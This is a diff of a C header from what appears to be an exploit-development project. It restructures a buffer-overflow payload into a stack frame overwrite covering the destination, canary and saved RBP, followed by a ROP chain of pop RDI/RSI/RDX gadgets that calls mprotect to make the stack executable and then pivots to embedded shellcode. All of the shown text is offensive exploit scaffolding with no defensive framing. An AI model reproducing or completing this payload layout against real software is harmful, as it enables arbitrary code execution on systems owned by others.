@@ -3,26 +3,36 @@
 #include "addresses.h"
 #include "shellcode.h"
 
-typedef struct Payload {
-	// Stack frame from/including the buffer
-	AddressUnion	pl_dst;
-	AddressUnion	pl_canary;
+// 
+typedef struct StackFrame {
+	// Stack frame
+	AddressUnion	sf_dst;
+	AddressUnion	sf_canary;
+	AddressUnion	sf_rbp;
+} StackFrame, *StackFramePtr;
 
+typedef struct ROPChain {
 	// ROP chain to make the stack executable
-	AddressUnion	pl_rbp;
-	AddressUnion	pl_popRDI;
-	AddressUnion	pl_stackPage;
-	AddressUnion	pl_popRSI;
-	ptrdiff_t	pl_stackSize;
-	AddressUnion	pl_popRDX;
-	long		pl_permission;
-	AddressUnion	pl_nop;
-	AddressUnion	pl_mprotect;
+	AddressUnion	rc_popRDI;
+	AddressUnion	rc_stackPage;
+	AddressUnion	rc_popRSI;
+	ptrdiff_t	rc_stackSize;
+	AddressUnion	rc_popRDX;
+	long		rc_permission;
+	AddressUnion	rc_nop;
+	AddressUnion	rc_mprotect;
+	AddressUnion	rc_shellCode; // Call me stackPivot()
+} ROPChain, *ROPChainPtr;
 
-	// Stack pivot to executable code (&pl_scu)
-	AddressUnion	pl_shellCode;
+// Common part of any payload (fixups can be done to these fields)
+typedef struct PayloadCommon {
+	StackFrame	pc_stackFrame;
+	ROPChain	pc_ROPChain;
+} PayloadCommon, *PayloadCommonPtr;
 
-	// Freedom!
+// Composite payload containing fixed and (possibly) variable sections
+typedef struct Payload {
+	PayloadCommon	pl_common;
 	ShellcodeUnion	pl_scu;
 } Payload, *PayloadPtr;
 
